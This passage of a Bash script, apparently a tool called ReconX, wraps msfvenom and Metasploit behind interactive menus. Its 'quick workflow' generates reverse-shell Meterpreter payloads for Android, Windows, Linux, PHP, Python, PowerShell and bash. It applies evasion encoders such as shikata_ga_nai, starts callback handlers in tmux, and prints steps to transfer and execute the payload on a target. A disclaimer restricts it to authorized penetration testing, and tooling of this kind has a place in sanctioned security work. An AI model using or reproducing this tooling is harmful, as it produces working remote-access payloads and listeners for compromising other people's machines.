  
  local output_path="$PAYLOAD_DIR/$outfile"
  local cmd=("$MSFVENOM_BIN" "-p" "$custom_payload" "LHOST=$lh" "LPORT=$lp" "-f" "$fmt" "-o" "$output_path")
  
  log INFO "Executing: ${cmd[*]}"
  
  if "${cmd[@]}"; then
    log SUCCESS "Custom payload generated: $output_path"
    read -rp "Start handler? [Y/n]: " start_h
    if [[ ! "$start_h" =~ ^[Nn]$ ]]; then
      start_handler "$lh" "$lp" "$custom_payload" "false" ""
    fi
  else
    log ERROR "Failed to generate custom payload"
  fi
  
  read -rp "Press Enter to continue..."
}

# ============================================================================
# MENU - HANDLER MANAGEMENT
# ============================================================================
menu_handler_management() {
  while true; do
    show_banner
    echo -e "${CYAN}${BOLD}Handler Management${NC}"
    echo ""
    echo -e "${GREEN}  1)${NC} Start Single Handler"
    echo -e "${GREEN}  2)${NC} Start Multiple Handlers"
    echo -e "${GREEN}  3)${NC} List Active Sessions (tmux/screen)"
    echo -e "${GREEN}  4)${NC} Attach to Handler Session"
    echo -e "${GREEN}  5)${NC} Kill Handler Session"
    echo -e "${RED}  0)${NC} Back to Main Menu"
    echo ""
    
    read -rp "$(echo -e ${CYAN}Select [0-5]: ${NC})" choice
    
    case "$choice" in
      1)
        local lh lp pl migrate
        read -rp "PAYLOAD (e.g., windows/meterpreter/reverse_tcp): " pl
        read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
        read -rp "LPORT (default $DEFAULT_LPORT): " lp; lp="${lp:-$DEFAULT_LPORT}"
        read -rp "Enable auto-migrate? [y/N]: " migrate
        migrate=$([[ "$migrate" =~ ^[Yy]$ ]] && echo "true" || echo "false")
        start_handler "$lh" "$lp" "$pl" "$migrate" ""
        read -rp "Press Enter..."
        ;;
      2)
        local lh sp cnt
        read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
        read -rp "Starting PORT (default 4444): " sp; sp="${sp:-4444}"
        read -rp "Number of handlers (default 5): " cnt; cnt="${cnt:-5}"
        start_multiple_handlers "$lh" "$sp" "$cnt" "windows/meterpreter/reverse_tcp"
        read -rp "Press Enter..."
        ;;
      3)
        if command -v tmux &>/dev/null; then
          echo -e "${CYAN}Active tmux sessions:${NC}"
          tmux list-sessions 2>/dev/null || echo "No active sessions"
        fi
        if command -v screen &>/dev/null; then
          echo ""
          echo -e "${CYAN}Active screen sessions:${NC}"
          screen -ls 2>/dev/null || echo "No active sessions"
        fi
        read -rp "Press Enter..."
        ;;
      4)
        if command -v tmux &>/dev/null; then
          tmux list-sessions 2>/dev/null
          read -rp "Enter session name to attach: " sess
          if [[ -n "$sess" ]]; then
            tmux attach -t "$sess"
          fi
        else
          log ERROR "tmux not installed"
          read -rp "Press Enter..."
        fi
        ;;
      5)
        if command -v tmux &>/dev/null; then
          tmux list-sessions 2>/dev/null
          read -rp "Enter session name to kill: " sess
          if [[ -n "$sess" ]]; then
            tmux kill-session -t "$sess"
            log SUCCESS "Session killed: $sess"
          fi
        else
          log ERROR "tmux not installed"
        fi
        read -rp "Press Enter..."
        ;;
      0) return ;;
      *) log ERROR "Invalid option"; sleep 1 ;;
    esac
  done
}

# ============================================================================
# MENU - INFORMATION & STATISTICS
# ============================================================================
menu_information() {
  while true; do
    show_banner
    echo -e "${CYAN}${BOLD}Information & Statistics${NC}"
    echo ""
    echo -e "${GREEN}  1)${NC} Show Statistics"
    echo -e "${GREEN}  2)${NC} List Generated Payloads"
    echo -e "${GREEN}  3)${NC} List RC Files"
    echo -e "${GREEN}  4)${NC} View Recent Logs"
    echo -e "${GREEN}  5)${NC} Network Interfaces"
    echo -e "${GREEN}  6)${NC} System Information"
    echo -e "${GREEN}  7)${NC} Check Dependencies"
    echo -e "${RED}  0)${NC} Back to Main Menu"
    echo ""
    
    read -rp "$(echo -e ${CYAN}Select [0-7]: ${NC})" choice
    
    case "$choice" in
      1)
        clear
        echo -e "${PURPLE}${BOLD}╔════════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}${BOLD}║     ReconX Statistics Dashboard        ║${NC}"
        echo -e "${PURPLE}${BOLD}╚════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}Payloads Generated:${NC} $(find "$PAYLOAD_DIR" -type f 2>/dev/null | wc -l)"
        echo -e "${CYAN}RC Files Created:${NC} $(find "$RC_DIR" -type f 2>/dev/null | wc -l)"
        echo -e "${CYAN}Total Disk Usage:${NC} $(du -sh "$BASE_DIR" 2>/dev/null | cut -f1)"
        echo -e "${CYAN}Base Directory:${NC} $BASE_DIR"
        echo ""
        echo -e "${YELLOW}Recent Payloads:${NC}"
        find "$PAYLOAD_DIR" -type f -printf "%T@ %p\n" 2>/dev/null | sort -rn | head -5 | while read -r ts file; do
          echo "  $(date -d "@${ts%.*}" '+%Y-%m-%d %H:%M:%S' 2>/dev/null || date -r "${ts%.*}" '+%Y-%m-%d %H:%M:%S' 2>/dev/null) - $(basename "$file")"
        done
        read -rp "Press Enter..."
        ;;
      2)
        echo -e "${CYAN}${BOLD}Generated Payloads:${NC}"
        find "$PAYLOAD_DIR" -type f -exec ls -lh {} \; 2>/dev/null | awk '{printf "  %s  %s  %s\n", $9, $5, $6" "$7" "$8}' || echo "No payloads found"
        read -rp "Press Enter..."
        ;;
      3)
        echo -e "${CYAN}${BOLD}Resource Files:${NC}"
        find "$RC_DIR" -type f -exec ls -lh {} \; 2>/dev/null | awk '{printf "  %s  %s\n", $9, $6" "$7" "$8}' || echo "No RC files found"
        read -rp "Press Enter..."
        ;;
      4)
        echo -e "${CYAN}${BOLD}Recent Logs (last 30 lines):${NC}"
        tail -30 "$LOG_DIR/reconx.log" 2>/dev/null || echo "No logs found"
        read -rp "Press Enter..."
        ;;
      5)
        echo -e "${CYAN}${BOLD}Network Interfaces:${NC}"
        ip -br addr show 2>/dev/null || ifconfig 2>/dev/null || echo "Cannot retrieve interfaces"
        read -rp "Press Enter..."
        ;;
      6)
        echo -e "${CYAN}${BOLD}System Information:${NC}"
        echo "  OS: $(uname -s) $(uname -r)"
        echo "  Architecture: $(uname -m)"
        echo "  Hostname: $(hostname)"
        echo "  User: $(whoami)"
        echo "  Shell: $SHELL"
        echo "  Uptime: $(uptime -p 2>/dev/null || uptime)"
        read -rp "Press Enter..."
        ;;
      7)
        check_dependencies
        read -rp "Press Enter..."
        ;;
      0) return ;;
      *) log ERROR "Invalid option"; sleep 1 ;;
    esac
  done
}

# ============================================================================
# MENU - SETTINGS
# ============================================================================
menu_settings() {
  while true; do
    show_banner
    echo -e "${CYAN}${BOLD}Configuration & Settings${NC}"
    echo ""
    echo -e "${GREEN}  1)${NC} Change Default LHOST (Current: $DEFAULT_LHOST)"
    echo -e "${GREEN}  2)${NC} Change Default LPORT (Current: $DEFAULT_LPORT)"
    echo -e "${GREEN}  3)${NC} Clean Payloads Directory"
    echo -e "${GREEN}  4)${NC} Clean Logs"
    echo -e "${GREEN}  5)${NC} Clean All Data"
    echo -e "${GREEN}  6)${NC} Create Backup"
    echo -e "${GREEN}  7)${NC} Show Directory Structure"
    echo -e "${RED}  0)${NC} Back to Main Menu"
    echo ""
    
    read -rp "$(echo -e ${CYAN}Select [0-7]: ${NC})" choice
    
    case "$choice" in
      1)
        read -rp "New LHOST: " new_lhost
        if validate_ip "$new_lhost"; then
          DEFAULT_LHOST="$new_lhost"
          log SUCCESS "LHOST changed to: $DEFAULT_LHOST"
        else
          log ERROR "Invalid IP address"
        fi
        read -rp "Press Enter..."
        ;;
      2)
        read -rp "New LPORT: " new_lport
        if validate_port "$new_lport"; then
          DEFAULT_LPORT="$new_lport"
          log SUCCESS "LPORT changed to: $DEFAULT_LPORT"
        else
          log ERROR "Invalid port"
        fi
        read -rp "Press Enter..."
        ;;
      3)
        read -rp "Delete all payloads? [y/N]: " confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
          rm -rf "${PAYLOAD_DIR:?}"/*
          log SUCCESS "Payloads deleted"
        fi
        read -rp "Press Enter..."
        ;;
      4)
        read -rp "Clear all logs? [y/N]: " confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
          > "$LOG_DIR/reconx.log"
          > "$LOG_DIR/payload_errors.log"
          log SUCCESS "Logs cleared"
        fi
        read -rp "Press Enter..."
        ;;
      5)
        read -rp "Delete ALL data in $BASE_DIR? [y/N]: " confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
          read -rp "Are you ABSOLUTELY sure? Type 'DELETE' to confirm: " confirm2
          if [[ "$confirm2" == "DELETE" ]]; then
            rm -rf "${BASE_DIR:?}"/*
            create_directory_structure
            log SUCCESS "All data deleted"
          fi
        fi
        read -rp "Press Enter..."
        ;;
      6)
        local backup_file="$BACKUP_DIR/reconx_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
        tar -czf "$backup_file" -C "$BASE_DIR" . 2>/dev/null
        if [[ -f "$backup_file" ]]; then
          log SUCCESS "Backup created: $backup_file"
        else
          log ERROR "Backup failed"
        fi
        read -rp "Press Enter..."
        ;;
      7)
        echo -e "${CYAN}${BOLD}Directory Structure:${NC}"
        tree -L 2 "$BASE_DIR" 2>/dev/null || find "$BASE_DIR" -maxdepth 2 -type d 2>/dev/null
        read -rp "Press Enter..."
        ;;
      0) return ;;
      *) log ERROR "Invalid option"; sleep 1 ;;
    esac
  done
}

# ============================================================================
# MENU - QUICK WORKFLOW
# ============================================================================
menu_quick_workflow() {
  show_banner
  echo -e "${CYAN}${BOLD}Quick Generate + Start Handler${NC}"
  echo -e "${YELLOW}Fast payload generation with automatic handler startup${NC}"
  echo ""
  
  echo -e "${CYAN}${BOLD}Select Quick Payload Type:${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} Android APK              ${BLUE}(Mobile)${NC}"
  echo -e "${GREEN}  2)${NC} Windows EXE x86          ${BLUE}(Most compatible)${NC}"
  echo -e "${GREEN}  3)${NC} Windows EXE x64          ${BLUE}(Modern systems)${NC}"
  echo -e "${GREEN}  4)${NC} Linux ELF x64            ${BLUE}(Server targets)${NC}"
  echo -e "${GREEN}  5)${NC} PHP Meterpreter          ${BLUE}(Web servers)${NC}"
  echo -e "${GREEN}  6)${NC} Python Script            ${BLUE}(Cross-platform)${NC}"
  echo -e "${GREEN}  7)${NC} PowerShell               ${BLUE}(Windows systems)${NC}"
  echo -e "${GREEN}  8)${NC} Bash Shell               ${BLUE}(Linux/Unix)${NC}"
  echo ""
  echo -e "${RED}  0)${NC} Back to Main Menu"
  echo ""
  
  read -rp "$(echo -e ${CYAN}Select [0-8]: ${NC})" choice
  
  local payload_type msf_payload encoder
  case "$choice" in
    1)
      payload_type="android"
      msf_payload="android/meterpreter/reverse_tcp"
      encoder="none"
      ;;
    2)
      payload_type="windows"
      msf_payload="windows/meterpreter/reverse_tcp"
      encoder="x86/shikata_ga_nai"
      ;;
    3)
      payload_type="windows-x64"
      msf_payload="windows/x64/meterpreter/reverse_tcp"
      encoder="x64/xor_dynamic"
      ;;
    4)
      payload_type="linux-x64"
      msf_payload="linux/x64/meterpreter/reverse_tcp"
      encoder="x64/xor_dynamic"
      ;;
    5)
      payload_type="php"
      msf_payload="php/meterpreter_reverse_tcp"
      encoder="none"
      ;;
    6)
      payload_type="python"
      msf_payload="python/meterpreter_reverse_tcp"
      encoder="none"
      ;;
    7)
      payload_type="powershell"
      msf_payload="windows/x64/meterpreter/reverse_tcp"
      encoder="cmd/powershell_base64"
      ;;
    8)
      payload_type="bash"
      msf_payload="cmd/unix/reverse_bash"
      encoder="none"
      ;;
    0) return ;;
    *)
      log ERROR "Invalid option"
      sleep 1
      return
      ;;
  esac
  
  echo ""
  echo -e "${CYAN}${BOLD}Configuration:${NC}"
  
  # LHOST
  read -rp "LHOST (default $DEFAULT_LHOST): " lh
  lh="${lh:-$DEFAULT_LHOST}"
  
  if ! validate_ip "$lh"; then
    log ERROR "Invalid IP address"
    read -rp "Press Enter..."
    return
  fi
  
  # LPORT
  read -rp "LPORT (default $DEFAULT_LPORT): " lp
  lp="${lp:-$DEFAULT_LPORT}"
  
  if ! validate_port "$lp"; then
    log ERROR "Invalid port"
    read -rp "Press Enter..."
    return
  fi
  
  # Check if port is available
  if ! check_port_available "$lp"; then
    log WARNING "Port $lp appears to be in use"
    read -rp "Continue anyway? [y/N]: " cont
    [[ ! "$cont" =~ ^[Yy]$ ]] && return
  fi
  
  # Encoding option
  local use_encoder="n"
  local iterations="3"
  
  if [[ "$encoder" != "none" ]]; then
    echo ""
    echo -e "${YELLOW}Recommended encoder: $encoder${NC}"
    read -rp "Use encoding? [Y/n]: " use_encoder
    use_encoder="${use_encoder:-Y}"
    
    if [[ "$use_encoder" =~ ^[Yy]$ ]]; then
      read -rp "Iterations (default 3): " iterations
      iterations="${iterations:-3}"
    else
      encoder="none"
    fi
  fi
  
  # Auto-migrate option (for Windows)
  local auto_migrate="false"
  if [[ "$payload_type" =~ ^windows ]]; then
    echo ""
    read -rp "Enable auto-migrate? [y/N]: " migrate_opt
    [[ "$migrate_opt" =~ ^[Yy]$ ]] && auto_migrate="true"
  fi
  
  echo ""
  echo -e "${GREEN}${BOLD}═══════════════════════════════════════════${NC}"
  echo -e "${CYAN}Starting quick workflow...${NC}"
  echo -e "${GREEN}${BOLD}═══════════════════════════════════════════${NC}"
  echo ""
  
  # Step 1: Generate Payload
  log INFO "Step 1/2: Generating payload..."
  
  if [[ "$use_encoder" =~ ^[Yy]$ ]]; then
    if ! generate_payload "$payload_type" "$lh" "$lp" "$encoder" "$iterations" "" ""; then
      log ERROR "Payload generation failed"
      read -rp "Press Enter..."
      return
    fi
  else
    if ! generate_payload "$payload_type" "$lh" "$lp" "none" "1" "" ""; then
      log ERROR "Payload generation failed"
      read -rp "Press Enter..."
      return
    fi
  fi
  
  echo ""
  
  # Step 2: Start Handler
  log INFO "Step 2/2: Starting handler..."
  sleep 1
  
  if start_handler "$lh" "$lp" "$msf_payload" "$auto_migrate" ""; then
    echo ""
    echo -e "${GREEN}${BOLD}═══════════════════════════════════════════${NC}"
    log SUCCESS "Quick workflow completed successfully!"
    echo -e "${GREEN}${BOLD}═══════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}Summary:${NC}"
    echo -e "${GREEN}  ✓${NC} Payload generated"
    echo -e "${GREEN}  ✓${NC} Handler started on $lh:$lp"
    echo -e "${GREEN}  ✓${NC} Payload type: $msf_payload"
    
    if [[ "$encoder" != "none" && "$use_encoder" =~ ^[Yy]$ ]]; then
      echo -e "${GREEN}  ✓${NC} Encoding: $encoder (x$iterations)"
    fi
    
    if [[ "$auto_migrate" == "true" ]]; then
      echo -e "${GREEN}  ✓${NC} Auto-migrate enabled"
    fi
    
    echo ""
    echo -e "${CYAN}Next steps:${NC}"
    echo "  1. Transfer the payload to target system"
    echo "  2. Execute the payload on target"
    echo "  3. Check handler for incoming connection"
    echo ""
    
    if command -v tmux &>/dev/null; then
      echo -e "${YELLOW}Handler running in tmux session: msf-handler-$lp${NC}"
      echo -e "${YELLOW}Attach with: tmux attach -t msf-handler-$lp${NC}"
      echo ""
    fi
    
  else
    log ERROR "Handler startup failed"
  fi
  
  read -rp "Press Enter to continue..."
}

# ============================================================================
# MAIN MENU
# ============================================================================
main_menu() {
  while true; do
    show_banner
    echo -e "${WHITE}${BOLD}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}║                    MAIN MENU                           ║${NC}"
    echo -e "${WHITE}${BOLD}╚════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}  1)${NC} Payload Generation           ${BLUE}(All platforms)${NC}"
    echo -e "${GREEN}  2)${NC} Handler Management           ${BLUE}(Start/Stop/Monitor)${NC}"
    echo -e "${GREEN}  3)${NC} Information & Statistics     ${BLUE}(View data)${NC}"
    echo -e "${GREEN}  4)${NC} Configuration & Settings     ${BLUE}(Customize)${NC}"
    echo -e "${YELLOW}  5)${NC} ${BOLD}Quick Workflow${NC}               ${YELLOW}⚡ (Generate + Handler)${NC}"
    echo ""
    echo -e "${RED}  0)${NC} Exit"
    echo ""
    
    read -rp "$(echo -e ${CYAN}${BOLD}Select [0-5]: ${NC})" choice
    
    case "$choice" in
      1) menu_payload_generation ;;
      2) menu_handler_management ;;
      3) menu_information ;;
      4) menu_settings ;;
      5) menu_quick_workflow ;;
      0)
        echo ""
        log SUCCESS "Thank you for using ReconX! Stay secure! 🛡️"
        echo ""
        exit 0
        ;;
      *)
        log ERROR "Invalid option"
        sleep 1
        ;;
    esac
  done
}

# ============================================================================
# INITIALIZATION & MAIN
# ============================================================================
show_disclaimer() {
  clear
  echo -e "${RED}${BOLD}"
  cat <<'DISCLAIMER'
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                        ⚠️  LEGAL DISCLAIMER ⚠️                     ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  This tool is designed for AUTHORIZED PENETRATION TESTING and     ║
║  EDUCATIONAL PURPOSES ONLY.                                       ║
║                                                                   ║
║  Unauthorized access to computer systems is STRICTLY ILLEGAL      ║
║  and may result in criminal prosecution under applicable laws.    ║
║                                                                   ║
║  The author(s) and contributors of this tool accept NO            ║
║  responsibility or liability for any misuse or damage caused      ║
║  by this program.                                                 ║
║                                                                   ║
║  By using this tool, you agree to:                                ║
║  • Use it only on systems you own or have explicit written        ║
║    permission to test                                             ║
║  • Comply with all applicable laws and regulations                ║
║  • Accept full responsibility for your actions                    ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
DISCLAIMER
  echo -e "${NC}"
  echo ""
  read -rp "$(echo -e ${GREEN}${BOLD}I understand and agree to the terms [y/N]: ${NC})" agree
  
  if [[ ! "$agree" =~ ^[Yy]$ ]]; then
    echo ""
    log ERROR "You must agree to the terms to continue"
    exit 1
  fi
  
  echo ""
  log SUCCESS "Terms accepted. Initializing..."
  sleep 1
}

main() {
  # Show disclaimer
  show_disclaimer
  
  # Create directory structure
  create_directory_structure || {
    log ERROR "Failed to create directory structure"
    exit 1
  }
  
  # Detect LHOST
  DEFAULT_LHOST=$(detect_lhost)
  
  # Check dependencies
  check_dependencies
  
  # Log startup
  log INFO "ReconX v${SCRIPT_VERSION} started"
  log INFO "User: $(whoami)"
  log INFO "LHOST: $DEFAULT_LHOST"
  log INFO "Base Directory: $BASE_DIR"
  
  # Start main menu
  main_menu
}

# Run main function
main "$@"
